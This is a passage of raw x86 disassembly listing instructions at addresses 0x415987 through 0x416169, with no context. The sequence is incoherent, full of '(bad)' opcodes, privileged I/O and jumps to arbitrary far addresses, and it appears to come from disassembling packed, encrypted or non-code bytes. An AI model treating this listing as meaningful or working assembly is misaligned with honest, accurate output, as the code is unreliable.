  415987:	loopne 0x4159b6
  415989:	pop    edi
  41598a:	aam    0xed
  41598c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41598d:	pusha  
  41598e:	mov    edx,0xdd1642a1
  415993:	push   es
  415994:	mov    ds:0x9ea9da67,al
  415999:	loopne 0x41598f
  41599b:	or     edx,ebp
  41599d:	mov    al,ds:0xbbd88797
  4159a2:	dec    esp
  4159a3:	call   0xf0336624
  4159a8:	imul   ebp,DWORD PTR [esi],0xffffff8e
  4159ab:	add    eax,0x85d81e29
  4159b0:	jmp    FWORD PTR [ebp+0x6ca45e25]
  4159b6:	push   ebx
  4159b7:	sub    eax,0x4cd6e115
  4159bc:	jp     0x41595a
  4159be:	sub    al,0x68
  4159c0:	mov    edi,0x3ac06c79
  4159c5:	push   ebx
  4159c6:	cmp    cl,al
  4159c8:	adc    eax,0xd70ad8d6
  4159cd:	lds    edi,FWORD PTR [ecx+0x494a8875]
  4159d3:	push   ss
  4159d4:	in     eax,0xd9
  4159d6:	mov    ds:0x21da040b,al
  4159db:	inc    edx
  4159dc:	pop    ds
  4159dd:	imul   eax,DWORD PTR [ebp-0x48],0xffffffdd
  4159e1:	rcr    BYTE PTR [esi+0x5d],cl
  4159e4:	adc    DWORD PTR [esi],ecx
  4159e6:	dec    ebx
  4159e7:	leavew 
  4159e9:	popa   
  4159ea:	xor    dh,bh
  4159ec:	dec    ecx
  4159ed:	xor    al,0x8d
  4159ef:	aaa    
  4159f0:	jne    0x415a04
  4159f2:	(bad)  
  4159f4:	adc    ebx,DWORD PTR [ebx+edi*2-0x6c]
  4159f8:	ins    BYTE PTR es:[edi],dx
  4159f9:	aas    
  4159fa:	cs xor esi,edi
  4159fd:	xchg   esp,eax
  4159fe:	mov    dh,0xea
  415a00:	xor    eax,0x571a5be2
  415a05:	push   edx
  415a07:	jno    0x415a27
  415a09:	mov    ebx,0xd46c1481
  415a0e:	icebp  
  415a0f:	mov    al,ds:0xd1361bac
  415a14:	jb     0x415a30
  415a16:	loop   0x415a51
  415a18:	inc    esi
  415a19:	push   ss
  415a1a:	mov    cs,WORD PTR [eax+edx*1+0x1b1d16fe]
  415a21:	into   
  415a22:	test   BYTE PTR [ecx],al
  415a24:	add    al,0xaf
  415a26:	js     0x415a63
  415a28:	xchg   edi,eax
  415a29:	mov    ds:0xedb0eb96,al
  415a2e:	in     eax,dx
  415a2f:	mov    edx,0x12001242
  415a34:	sub    DWORD PTR [eax],esp
  415a36:	lahf   
  415a37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415a38:	fisttp WORD PTR [esi+0x4d]
  415a3b:	enter  0x43f5,0x13
  415a3f:	nop
  415a40:	sahf   
  415a41:	sub    eax,0x124b910c
  415a46:	sbb    al,0x3a
  415a48:	xchg   ebp,eax
  415a49:	dec    eax
  415a4a:	adc    dl,BYTE PTR [edx-0x7309438f]
  415a50:	lods   al,BYTE PTR ds:[esi]
  415a51:	inc    ebp
  415a52:	sub    eax,0x5318fc38
  415a57:	enter  0x7c8d,0x53
  415a5b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a5c:	lods   al,BYTE PTR ds:[esi]
  415a5d:	icebp  
  415a5e:	shr    BYTE PTR [eax+0x1ea9d441],cl
  415a64:	push   ebp
  415a65:	in     eax,dx
  415a66:	inc    ebp
  415a67:	pusha  
  415a68:	jns    0x415a8c
  415a6a:	jmp    0x42c2:0x8781368b
  415a71:	retf   0xc8f8
  415a74:	shr    BYTE PTR [ecx+ebp*1-0x1bf427ca],0x59
  415a7c:	push   esi
  415a7d:	(bad)  
  415a7e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a7f:	popf   
  415a80:	imul   esp,DWORD PTR [eax],0xa2969044
  415a86:	jmp    0x5fc2bb50
  415a8b:	fmul   QWORD PTR [edx-0x2c]
  415a8e:	gs js  0x415a20
  415a91:	xchg   esp,esp
  415a93:	jp     0x415a87
  415a95:	xchg   esi,eax
  415a96:	dec    eax
  415a97:	xlat   BYTE PTR ds:[ebx]
  415a98:	add    eax,0x7d1edbb6
  415a9d:	dec    edi
  415a9e:	sbb    dh,BYTE PTR cs:[ecx-0xf34b4]
  415aa5:	xchg   edi,eax
  415aa6:	loope  0x415a2d
  415aa8:	out    0xa5,eax
  415aaa:	adc    ah,BYTE PTR [edx+edi*2]
  415aad:	adc    DWORD PTR [ecx],edi
  415aaf:	sub    BYTE PTR [ebx],cl
  415ab1:	push   ss
  415ab2:	outs   dx,BYTE PTR ds:[esi]
  415ab3:	arpl   WORD PTR [ebp+esi*2-0x5c076dc9],cx
  415aba:	das    
  415abb:	push   ecx
  415abc:	push   0xf9784584
  415ac1:	jnp    0x415a64
  415ac3:	mov    al,0x98
  415ac5:	loop   0x415ae3
  415ac7:	js     0x415af4
  415ac9:	cld    
  415aca:	push   esp
  415acb:	sbb    DWORD PTR [ebx-0x230e3d23],ebp
  415ad1:	sub    ebp,DWORD PTR [esp+eiz*4-0x22002274]
  415ad8:	xchg   edi,eax
  415ad9:	call   0x8888a0cc
  415ade:	xchg   esi,eax
  415adf:	or     ah,dh
  415ae1:	outs   dx,BYTE PTR ds:[esi]
  415ae2:	add    BYTE PTR [ebx-0x7f],dh
  415ae5:	je     0x415ace
  415ae7:	cmc    
  415ae8:	jecxz  0x415af1
  415aea:	dec    edx
  415aeb:	(bad)  
  415aec:	fadd   QWORD PTR ds:0xedfc922b
  415af2:	jns    0x415b0a
  415af4:	mov    ebx,0x422c3a44
  415af9:	inc    ebp
  415afa:	ss jne 0x415b71
  415afd:	loopne 0x415b78
  415aff:	call   0x183c:0x18663d4
  415b06:	xchg   ecx,eax
  415b07:	fisub  DWORD PTR [edx-0x66]
  415b0a:	out    dx,al
  415b0b:	int    0x51
  415b0d:	push   es
  415b0e:	in     al,0x35
  415b10:	fucomi st,st(7)
  415b12:	pop    ebx
  415b13:	neg    bh
  415b15:	mov    ds:0xc7a2a718,eax
  415b1a:	lea    esi,[ebx+0x3]
  415b1d:	test   eax,0xc1622632
  415b22:	cmp    al,0x81
  415b24:	fist   WORD PTR [ecx+0x3a]
  415b27:	shr    al,1
  415b29:	sbb    dl,BYTE PTR [ebp+ebx*8+0x1cfb9669]
  415b30:	(bad)
  415b33:	mov    esi,0x7c2d946d
  415b38:	push   ecx
  415b39:	mov    bl,0xa8
  415b3b:	pop    ebx
  415b3c:	cmp    dl,BYTE PTR [ebp-0x47]
  415b3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415b40:	jbe    0x415b40
  415b42:	mov    edi,0xfafbbc27
  415b47:	jge    0x415b79
  415b49:	ins    DWORD PTR es:[edi],dx
  415b4a:	fnstsw WORD PTR [ecx]
  415b4c:	xor    eax,DWORD PTR [edi-0x75]
  415b4f:	xor    bl,BYTE PTR [edi-0x5d]
  415b52:	mov    al,ds:0x9f2dfab3
  415b57:	popf   
  415b58:	mov    ?,WORD PTR [edx+0x21]
  415b5b:	lods   eax,DWORD PTR ds:[esi]
  415b5c:	popf   
  415b5d:	int    0xce
  415b5f:	enter  0x619c,0x78
  415b63:	push   0xfdba6d7b
  415b68:	xchg   ebx,eax
  415b69:	bound  eax,QWORD PTR [ebx+0x3ae61716]
  415b6f:	out    dx,eax
  415b70:	xchg   ebp,eax
  415b71:	mov    ebx,0x505c5c44
  415b76:	or     bl,BYTE PTR [ebp+0x2b]
  415b79:	add    edx,DWORD PTR [ebx-0x47ea74e2]
  415b7f:	aam    0xad
  415b81:	cmc    
  415b82:	fbstp  TBYTE PTR [eax]
  415b84:	jb     0x415b5d
  415b86:	mov    al,ds:0xbcfd04c7
  415b8b:	push   ds
  415b8c:	mov    eax,ds:0x58b9cf2b
  415b91:	push   eax
  415b92:	pop    ss
  415b93:	pushf  
  415b94:	cmp    ebx,DWORD PTR [edi+eax*8-0xf7b49e7]
  415b9b:	aam    0x5f
  415b9d:	lea    ecx,[edi]
  415b9f:	xchg   ecx,eax
  415ba0:	inc    edx
  415ba1:	sar    dl,1
  415ba3:	call   0x5529:0x6775b093
  415baa:	rol    DWORD PTR [ebx],cl
  415bac:	inc    ebx
  415bad:	fwait
  415bae:	and    al,0x16
  415bb0:	test   DWORD PTR [edi+0x21],edx
  415bb3:	dec    ebx
  415bb4:	or     eax,0x18524426
  415bb9:	xor    cl,BYTE PTR [ebx]
  415bbb:	dec    DWORD PTR [eax+ebx*1+0x74]
  415bbf:	cdq    
  415bc0:	sbb    dl,dl
  415bc2:	(bad)  
  415bc3:	(bad)  
  415bc4:	jae    0x415c28
  415bc6:	cdq    
  415bc7:	add    ecx,DWORD PTR [ecx+ecx*2-0xa]
  415bcb:	repnz rol BYTE PTR [edi+0x7e],1
  415bcf:	add    DWORD PTR [ecx-0x77b03eeb],esi
  415bd5:	xchg   ebx,eax
  415bd6:	ja     0x415c36
  415bd8:	dec    esp
  415bd9:	cmp    al,ch
  415bdb:	test   al,0xb8
  415bdd:	nop
  415bde:	je     0x415bd7
  415be0:	out    dx,eax
  415be1:	jmp    0x415bcf
  415be3:	mov    db4,esi
  415be6:	(bad)  
  415be7:	cld    
  415be8:	lea    edi,[edi-0x50]
  415beb:	add    BYTE PTR [edi-0x2d232abc],dh
  415bf1:	adc    BYTE PTR ds:0xf5d389f4,al
  415bf7:	mov    DWORD PTR [ecx+0x76],0x53e19b37
  415bfe:	mov    WORD PTR [ecx+0x79575f65],cs
  415c04:	aas    
  415c05:	ja     0x415bde
  415c07:	push   esi
  415c08:	sub    DWORD PTR [eax-0x74],eax
  415c0b:	popa   
  415c0c:	scas   eax,DWORD PTR es:[edi]
  415c0d:	or     al,ah
  415c0f:	inc    ecx
  415c10:	pop    edx
  415c11:	loopne 0x415c20
  415c13:	out    dx,al
  415c14:	mov    eax,0x23679f37
  415c19:	stos   DWORD PTR es:[edi],eax
  415c1a:	adc    esi,esp
  415c1c:	jns    0x415c02
  415c1e:	or     BYTE PTR [edi+0x7ee067f6],ah
  415c24:	add    bh,BYTE PTR [ebx+ebp*4-0x54]
  415c28:	mov    edx,0x207c7761
  415c2d:	hlt    
  415c2e:	popf   
  415c2f:	sbb    BYTE PTR [edi],ah
  415c31:	bound  ebx,QWORD PTR [eax-0x3e]
  415c34:	add    dl,BYTE PTR fs:[edi-0x646049b3]
  415c3b:	inc    eax
  415c3c:	or     BYTE PTR [ecx],bh
  415c3e:	mov    ds:0x4827907f,al
  415c43:	aaa    
  415c44:	add    al,0x1b
  415c46:	jae    0x415c22
  415c48:	outs   dx,BYTE PTR ds:[esi]
  415c49:	sbb    esi,edi
  415c4b:	add    eax,0x18be95ed
  415c50:	mov    edx,0x6dd335e0
  415c55:	dec    ecx
  415c56:	sub    DWORD PTR ds:0xa85dcc19,edi
  415c5c:	ds push 0x699ad76c
  415c62:	lock div BYTE PTR [eax]
  415c65:	mov    ecx,0x6e001972
  415c6a:	aaa    
  415c6b:	in     eax,dx
  415c6c:	adc    edi,esp
  415c6e:	xchg   esp,eax
  415c6f:	add    eax,0x7863bf62
  415c74:	repz jmp 0x415c8b
  415c77:	lods   eax,DWORD PTR ds:[esi]
  415c78:	std    
  415c79:	sub    ebx,ebp
  415c7b:	lock ja 0x415c4a
  415c7e:	sub    BYTE PTR [edi-0x19],dl
  415c81:	pop    esp
  415c82:	ret    
  415c83:	es jge 0x415ce6
  415c86:	aas    
  415c87:	sbb    bl,BYTE PTR ds:0x77c97534
  415c8d:	push   ebp
  415c8e:	mov    ds:0x75719ff6,eax
  415c93:	ret    
  415c94:	sub    ebp,DWORD PTR [ebp+edx*1-0x709e3e69]
  415c9b:	pop    esi
  415c9c:	fsubr  QWORD PTR [edi]
  415c9e:	mov    ecx,0x5600f699
  415ca3:	fnstenv [eax]
  415ca5:	iret   
  415ca6:	sbb    eax,DWORD PTR ds:0x8014c358
  415cac:	call   0xb28d:0xa0d06c1c
  415cb3:	in     al,dx
  415cb4:	jne    0x415d29
  415cb6:	cwde   
  415cb7:	mov    eax,0xf8e4bbd7
  415cbc:	and    al,0x2e
  415cbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415cbf:	icebp  
  415cc0:	cli    
  415cc1:	das    
  415cc2:	call   0x798df0e
  415cc7:	pop    ds
  415cc8:	mov    ch,0x5e
  415cca:	or     al,0xa7
  415ccc:	push   es
  415ccd:	and    ah,al
  415ccf:	sti    
  415cd0:	arpl   WORD PTR [ebx+0x2d],si
  415cd3:	pop    edi
  415cd4:	sbb    edi,DWORD PTR ds:0xb96e28ad
  415cda:	int    0xe6
  415cdc:	ret    
  415cdd:	(bad)  
  415cde:	sbb    BYTE PTR [edi-0x69],dl
  415ce1:	shr    DWORD PTR [ecx],1
  415ce3:	(bad)  
  415ce4:	mov    ?,eax
  415ce6:	and    DWORD PTR [edi],eax
  415ce8:	dec    ecx
  415ce9:	or     eax,0x189b005f
  415cee:	jle    0x415d1e
  415cf0:	adc    edx,esp
  415cf2:	cmp    esp,DWORD PTR [eax+0x5e462ab6]
  415cf8:	add    bh,BYTE PTR [edi+0x75]
  415cfb:	repnz lea eax,[esi]
  415cfe:	jno    0x415c9f
  415d00:	pop    ebp
  415d01:	jmp    0x415d10
  415d03:	in     eax,0xb
  415d05:	cmp    esp,DWORD PTR [eax]
  415d07:	push   ebp
  415d08:	push   es
  415d09:	mov    al,0x2
  415d0b:	or     ebp,ebp
  415d0d:	push   0x79
  415d0f:	clc    
  415d10:	sub    BYTE PTR [edi-0x34],dh
  415d13:	stc    
  415d14:	pop    edx
  415d15:	or     DWORD PTR ds:0x94cc9427,0x364ea221
  415d1f:	out    dx,al
  415d20:	dec    eax
  415d21:	adc    BYTE PTR [ebp-0x36],0xc9
  415d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d26:	je     0x415cc5
  415d28:	ret    0xcc35
  415d2b:	mov    bl,0x5e
  415d2d:	adc    ah,BYTE PTR [edx+eax*2-0x48]
  415d31:	outs   dx,BYTE PTR ds:[esi]
  415d32:	mov    dl,0xe1
  415d34:	inc    esp
  415d35:	xchg   ebp,eax
  415d36:	sbb    al,0x7
  415d38:	xchg   edi,esp
  415d3a:	(bad)  
  415d3b:	addr16 (bad) 
  415d3d:	out    dx,al
  415d3e:	ja     0x415d5a
  415d40:	pusha  
  415d41:	xchg   edx,eax
  415d42:	add    DWORD PTR [edx-0x45],ebx
  415d45:	cdq    
  415d46:	push   es
  415d47:	cli    
  415d48:	inc    ebx
  415d49:	pop    es
  415d4a:	dec    edi
  415d4b:	xchg   edx,eax
  415d4c:	sub    eax,DWORD PTR cs:[ebx+0x4a]
  415d50:	or     eax,0x6343e781
  415d55:	jmp    0xeb1a:0x6330084b
  415d5c:	cmp    al,0xfb
  415d5e:	in     al,0x69
  415d60:	fucomi st,st(1)
  415d62:	jb     0x415cfe
  415d64:	fadd   st(6),st
  415d66:	mov    dl,0xb4
  415d68:	lahf   
  415d69:	lds    esi,FWORD PTR [edi+edx*2+0x75074235]
  415d70:	loop   0x415dc1
  415d72:	into   
  415d73:	adc    ebx,0x6
  415d76:	cld    
  415d77:	fwait
  415d78:	pop    ds
  415d79:	mov    fs,WORD PTR [edx+0x47]
  415d7c:	ins    BYTE PTR es:[edi],dx
  415d7d:	repz or bl,bh
  415d80:	and    bl,0x89
  415d83:	repz je 0x415d2a
  415d86:	les    ebp,FWORD PTR [edx+0x39]
  415d89:	sbb    bl,BYTE PTR [eax-0x124fd4eb]
  415d8f:	ret    0x957b
  415d92:	pminub mm4,mm0
  415d95:	add    edi,DWORD PTR [ebx+0x4c]
  415d98:	jmp    0x119ba3ed
  415d9d:	cmc    
  415d9e:	call   0xbabe:0x68f24f16
  415da5:	not    BYTE PTR [edi+0x661edb0b]
  415dab:	retf   
  415dac:	sbb    ebp,0xd96992fe
  415db2:	addr16 out dx,eax
  415db4:	push   edx
  415db5:	test   BYTE PTR [edi+0x6c],dl
  415db8:	adc    DWORD PTR [esi+0x244c0906],0x5e
  415dbf:	sbb    esi,DWORD PTR [ecx]
  415dc1:	es ret 0x868d
  415dc5:	test   BYTE PTR [esi+0x61],dl
  415dc8:	inc    edi
  415dc9:	push   eax
  415dca:	lods   eax,DWORD PTR ds:[esi]
  415dcb:	(bad)  
  415dcd:	clc    
  415dce:	pop    ss
  415dcf:	int3   
  415dd0:	mov    ebx,0x5eee681b
  415dd5:	jne    0x415e24
  415dd7:	ja     0x415da6
  415dd9:	addr16 sub eax,0x3aca8130
  415ddf:	cmp    DWORD PTR [ebx-0x3],0x186407d9
  415de6:	inc    ebp
  415de7:	dec    edx
  415de8:	loope  0x415de3
  415dea:	outs   dx,DWORD PTR ds:[esi]
  415deb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dec:	pop    eax
  415ded:	mov    WORD PTR [edx-0x2e],fs
  415df0:	xor    eax,0xe1b3541
  415df5:	dec    eax
  415df6:	ja     0x415e62
  415df8:	and    edi,DWORD PTR [edi+0x94b923f]
  415dfe:	mov    esi,0x6ce0cba4
  415e03:	adc    esp,DWORD PTR [edi-0x329fd61c]
  415e09:	test   al,0xf4
  415e0b:	(bad)  
  415e0c:	ja     0x415dc8
  415e0e:	or     ebx,DWORD PTR [ecx+eax*1+0x42]
  415e12:	sub    al,0xe1
  415e14:	pop    ebx
  415e15:	lods   al,BYTE PTR ds:[esi]
  415e16:	daa    
  415e17:	or     bh,BYTE PTR [eax+ecx*2]
  415e1a:	cs hlt 
  415e1c:	push   cs
  415e1d:	aam    0xd7
  415e1f:	ja     0x415e45
  415e21:	inc    ebx
  415e22:	push   ecx
  415e23:	ror    BYTE PTR [ecx],cl
  415e25:	mov    ?,WORD PTR [ecx-0x48]
  415e28:	rol    DWORD PTR [ebx-0x26],1
  415e2b:	test   eax,0xc2659072
  415e30:	out    0x56,eax
  415e32:	cmp    BYTE PTR [edx+0x1ac3ae98],ah
  415e38:	add    bh,BYTE PTR [edi+0x5b]
  415e3b:	stos   DWORD PTR es:[edi],eax
  415e3c:	and    al,0xc0
  415e3f:	or     DWORD PTR [edi+0x401811a2],esp
  415e45:	cdq    
  415e46:	mov    ecx,DWORD PTR [ecx-0x543df144]
  415e4c:	outs   dx,DWORD PTR ds:[esi]
  415e4d:	std    
  415e4e:	stos   BYTE PTR es:[edi],al
  415e4f:	inc    eax
  415e50:	adc    ch,BYTE PTR [ecx+0x2ca7a051]
  415e56:	(bad)  ds:0xbb92bd61
  415e5c:	clc    
  415e5d:	jl     0x415e3b
  415e5f:	rcr    DWORD PTR [edx+edi*4+0x48],cl
  415e63:	sub    DWORD PTR [edi+ecx*4],esp
  415e66:	dec    ax
  415e68:	adc    BYTE PTR [ecx-0x5a111bd3],bl
  415e6e:	in     al,0xda
  415e70:	mov    ecx,0x70d983a9
  415e75:	repz dec esi
  415e77:	ins    DWORD PTR es:[edi],dx
  415e78:	repz out 0x6f,eax
  415e7b:	inc    ebx
  415e7c:	pop    esi
  415e7d:	xchg   edi,eax
  415e7e:	in     eax,0x1c
  415e80:	mov    ecx,0x380db9c7
  415e85:	inc    edi
  415e86:	mov    ah,0xdd
  415e88:	or     esi,eax
  415e8a:	sub    ecx,ebp
  415e8c:	inc    ebx
  415e8d:	aam    0xa2
  415e8f:	sti    
  415e90:	adc    al,0xb1
  415e92:	mov    ah,0x5a
  415e94:	mov    ds:0x3007a7fc,al
  415e99:	sbb    eax,0x11427dd0
  415e9e:	inc    edi
  415ea0:	jmp    DWORD PTR [ebp+ecx*1+0x22cda90d]
  415ea7:	jl     0x415ec8
  415ea9:	xchg   BYTE PTR [eax+0x62c8ffb9],dl
  415eaf:	iret   
  415eb0:	sbb    BYTE PTR [esi+0x312a699d],ch
  415eb6:	test   DWORD PTR [ebp-0x70],edx
  415eb9:	sbb    al,ch
  415ebb:	ror    DWORD PTR [edx+0x62],1
  415ebe:	out    dx,al
  415ebf:	sub    DWORD PTR [ebx-0x20995495],edi
  415ec5:	pop    edx
  415ec6:	addr16 in al,dx
  415ec8:	inc    esi
  415ec9:	jne    0x415f16
  415ecb:	sbb    BYTE PTR [edi],cl
  415ecd:	mov    eax,0x3af434c4
  415ed2:	and    eax,0x679d4772
  415ed7:	adc    ebx,edx
  415ed9:	pop    esp
  415eda:	popfw  
  415edc:	gs inc ebp
  415ede:	inc    edi
  415edf:	fsub   QWORD PTR [esi-0x9255926]
  415ee5:	out    0xe9,al
  415ee7:	add    DWORD PTR [edx-0x69],edx
  415eea:	inc    ebp
  415eeb:	nop
  415eec:	xchg   edx,eax
  415eed:	jge    0x415e98
  415eef:	aas    
  415ef0:	add    eax,0x3e97c950
  415ef5:	in     eax,dx
  415ef6:	in     al,dx
  415ef7:	jl     0x415f4b
  415ef9:	scas   ax,WORD PTR es:[edi]
  415efb:	std    
  415efc:	push   eax
  415efd:	and    eax,0x5a7d0abf
  415f02:	jnp    0x415f79
  415f04:	lods   al,BYTE PTR ds:[esi]
  415f05:	sbb    edi,0xf5cdcaa4
  415f0b:	or     al,0xfe
  415f0d:	cmp    bl,dh
  415f0f:	iret   
  415f10:	hlt    
  415f11:	cmp    eax,DWORD PTR [esi-0xf7f506d]
  415f17:	xchg   BYTE PTR [eax+0x59bbcce9],ch
  415f1d:	jno    0x415ec4
  415f1f:	ja     0x415f6c
  415f21:	mov    dl,0xe6
  415f23:	mov    eax,0x1a44f1d1
  415f28:	mov    al,0xd3
  415f2a:	cmc    
  415f2b:	dec    eax
  415f2c:	out    0x20,al
  415f2e:	push   ds
  415f2f:	leave  
  415f30:	sub    DWORD PTR [ebx],edi
  415f32:	cmp    DWORD PTR [esi],edi
  415f34:	pushf  
  415f35:	test   ah,bh
  415f37:	sar    cl,0x76
  415f3a:	push   0xffffffb8
  415f3c:	lods   al,BYTE PTR ds:[esi]
  415f3d:	fsubr  st(1),st
  415f3f:	call   0xac2f5e1f
  415f44:	and    DWORD PTR [esi-0x32],edi
  415f47:	sub    BYTE PTR [eax-0x68],bl
  415f4a:	sub    al,0x2d
  415f4c:	adc    BYTE PTR ds:0x9fcaa9c2,ah
  415f52:	cmp    BYTE PTR [ecx+edi*1+0x38],al
  415f56:	jnp    0x415f95
  415f58:	xchg   ebp,eax
  415f59:	pop    edx
  415f5a:	push   esi
  415f5b:	adc    eax,0x2dd6b50c
  415f60:	mov    edi,0x6809f357
  415f65:	mov    ebp,0x4fdf63ec
  415f6a:	stos   BYTE PTR es:[edi],al
  415f6b:	ror    DWORD PTR [esi+ebx*8-0x5e],0x5d
  415f70:	jne    0x415efe
  415f72:	push   ecx
  415f73:	xlat   BYTE PTR ds:[ebx]
  415f74:	jge    0x415f7f
  415f76:	add    BYTE PTR [edi+edi*8+0x3f1d180a],al
  415f7d:	xor    DWORD PTR [ebp-0x241f3e03],0xe759ae2e
  415f87:	dec    esi
  415f88:	pushf  
  415f89:	rcl    DWORD PTR [edx+0x65],cl
  415f8c:	pop    edx
  415f8d:	ss pop ecx
  415f8f:	addr16 mov bl,0x43
  415f92:	adc    DWORD PTR [edx],edi
  415f94:	sub    BYTE PTR [eax],cl
  415f96:	fs das 
  415f98:	int3   
  415f99:	(bad)  [ebp-0x34ae37ef]
  415f9f:	jmp    0x581d4895
  415fa4:	adc    DWORD PTR [ecx],edx
  415fa6:	mov    BYTE PTR [ecx-0x46],bl
  415fa9:	ja     0x416009
  415fab:	xor    eax,0x3d9fe318
  415fb0:	std    
  415fb1:	cmp    DWORD PTR [edx+0x149c7522],edx
  415fb7:	out    dx,al
  415fb8:	or     eax,0xf961f387
  415fbd:	sbb    DWORD PTR [esi],ebx
  415fbf:	xchg   DWORD PTR [eax+0x3f],ebp
  415fc2:	and    BYTE PTR [edi+0x10],cl
  415fc5:	push   edx
  415fc6:	test   DWORD PTR [ecx+0xf1e41d8],esi
  415fcc:	lds    esi,FWORD PTR [esi+0x3ffde9c4]
  415fd2:	scas   al,BYTE PTR es:[edi]
  415fd3:	sbb    BYTE PTR [ebx+0x76],bh
  415fd6:	jg     0x415f7b
  415fd8:	lock xchg ecx,eax
  415fda:	out    dx,eax
  415fdb:	and    BYTE PTR [edi],0xa5
  415fde:	shl    edi,1
  415fe0:	cmp    al,0x1e
  415fe2:	mov    edx,DWORD PTR [ecx+0x42]
  415fe5:	addr16 or dh,bh
  415fe8:	repnz test al,0xee
  415feb:	sbb    eax,0xafb32543
  415ff0:	lahf   
  415ff1:	or     DWORD PTR [eax+0x44baeb19],edx
  415ff7:	popf   
  415ff8:	mov    esp,0x19b8f03e
  415ffd:	sahf   
  415ffe:	push   0xffffffab
  416000:	jb     0x416051
  416002:	dec    eax
  416003:	test   eax,0x67d6da0e
  416008:	xor    bh,BYTE PTR [eax+0x20]
  41600b:	out    dx,al
  41600c:	cwde   
  41600d:	cpuid  
  41600f:	mov    ah,BYTE PTR [eax+0x10cc7b9]
  416015:	pop    eax
  416016:	jns    0x415fd2
  416018:	or     eax,0x6457d6f1
  41601d:	mov    edx,0x68253a4d
  416022:	fstp   DWORD PTR [edx-0x26]
  416025:	push   esp
  416026:	js     0x415ff1
  416028:	sub    dl,BYTE PTR [eax+0x4b]
  41602b:	add    eax,ebp
  41602d:	int3   
  41602e:	mov    bl,0xff
  416030:	and    ah,ch
  416032:	fisttp WORD PTR [ecx]
  416034:	nop
  416035:	ret    0x119d
  416038:	sub    BYTE PTR [ecx+0x5f],0x98
  41603c:	pop    edi
  41603d:	gs sar esp,0xda
  416041:	pop    esp
  416042:	mov    DWORD PTR [edx-0x80],edi
  416045:	popa   
  416046:	dec    edi
  416047:	int    0x6c
  416049:	cmc    
  41604a:	xor    ebx,DWORD PTR [edi-0x7]
  41604d:	(bad)  
  41604e:	iret   
  41604f:	adc    ebp,eax
  416051:	mov    ebp,ebp
  416053:	das    
  416054:	add    DWORD PTR [ebx+0x145e8af4],edi
  41605a:	sti    
  41605b:	jns    0x4160b6
  41605d:	cmp    ch,BYTE PTR [edx+eax*4+0xca47c69]
  416064:	stos   DWORD PTR es:[edi],eax
  416065:	mov    ds:0xd38a7b9b,eax
  41606a:	mov    ds:0x1513198e,eax
  41606f:	retf   0x7297
  416072:	mov    ebp,0x72b07b1
  416077:	and    DWORD PTR [edx-0x1118e38f],0xa5383276
  416081:	fsub   QWORD PTR [ebx+ebp*4]
  416084:	add    DWORD PTR [edi],edi
  416086:	test   eax,0x7fc6ea4f
  41608b:	pop    ebp
  41608c:	mov    eax,cs:0x7a8180e4
  416092:	loopne 0x416043
  416094:	test   eax,0x358eabe2
  416099:	mov    ebx,0x2aa0e59d
  41609e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41609f:	cmovns ebp,ecx
  4160a2:	cmp    al,0x4
  4160a4:	test   BYTE PTR [eax+0x22],ah
  4160a7:	call   0xce4a461c
  4160ac:	sub    bh,BYTE PTR [eax-0x537065ae]
  4160b2:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4160b4:	cmp    DWORD PTR [ebx+0x37],ebx
  4160b7:	test   al,0x4e
  4160b9:	std    
  4160ba:	cmp    eax,0xb3e4e8bc
  4160bf:	mov    ah,0x60
  4160c1:	push   esi
  4160c2:	lds    edx,FWORD PTR [eax]
  4160c4:	adc    ebp,DWORD PTR [esp+edi*2]
  4160c7:	fst    st(6)
  4160c9:	movsx  eax,WORD PTR [eax]
  4160cc:	dec    esi
  4160cd:	mov    edx,ebx
  4160cf:	lock sub BYTE PTR [edx],al
  4160d2:	retf   0x3d1f
  4160d5:	jns    0x416116
  4160d7:	es mov ah,0xdb
  4160da:	fdiv   QWORD PTR [eax+eiz*2]
  4160dd:	adc    BYTE PTR [ecx],al
  4160df:	mov    dh,BYTE PTR ds:0xb62cccfc
  4160e5:	lods   al,BYTE PTR ds:[esi]
  4160e6:	sbb    edx,DWORD PTR [esi]
  4160e8:	out    0x87,al
  4160ea:	xchg   esi,eax
  4160eb:	mov    ebx,0x5a549798
  4160f0:	sub    al,0x6a
  4160f2:	jge    0x41610a
  4160f4:	pop    ss
  4160f5:	cld    
  4160f6:	cmp    BYTE PTR [edx+edx*2-0x70dbc2ec],al
  4160fd:	enter  0x61a7,0x40
  416101:	mov    ds:0xc0606e44,eax
  416106:	dec    edi
  416107:	test   al,0xf2
  416109:	xchg   edi,eax
  41610a:	(bad)  [edi]
  41610c:	xchg   ebx,eax
  41610d:	addr16 in eax,0xb6
  416110:	imul   ebp,DWORD PTR [ecx],0x32
  416113:	xchg   DWORD PTR [eax+ebx*8-0x35],ecx
  416117:	xchg   edx,eax
  416118:	div    eax
  41611a:	xor    dh,BYTE PTR [esi+ebx*2-0x4a]
  41611e:	hlt    
  41611f:	mov    bl,0x3c
  416121:	test   DWORD PTR [edx*2-0x14d8abd9],esi
  416128:	fistp  WORD PTR [edi+ebp*4+0x54615445]
  41612f:	mov    bl,0xbd
  416131:	cmovae eax,DWORD PTR [edx+0x74]
  416135:	add    ebx,edx
  416137:	adc    edx,DWORD PTR [esi+0x4e]
  41613a:	jg     0x416180
  41613c:	fst    DWORD PTR [edi-0x25]
  41613f:	sbb    eax,0x244abaaa
  416144:	into   
  416145:	inc    edi
  416146:	add    eax,DWORD PTR [edx+edx*2-0x200f701e]
  41614d:	pop    ss
  41614e:	mov    DWORD PTR [eax+ebp*4+0x5c],eax
  416152:	cdq    
  416153:	mov    ebp,0xacddb3a9
  416158:	out    0x1c,al
  41615a:	push   es
  41615b:	jg     0x4161ce
  41615d:	outs   dx,BYTE PTR ds:[esi]
  41615e:	push   eax
  41615f:	lods   eax,DWORD PTR ds:[esi]
  416161:	pop    es
  416162:	lods   eax,DWORD PTR ds:[esi]
  416163:	xchg   ebx,eax
  416164:	and    DWORD PTR [ebx],eax
  416166:	adc    BYTE PTR [ebx],ch
  416168:	(bad)  
  416169:	xchg   ecx,eax
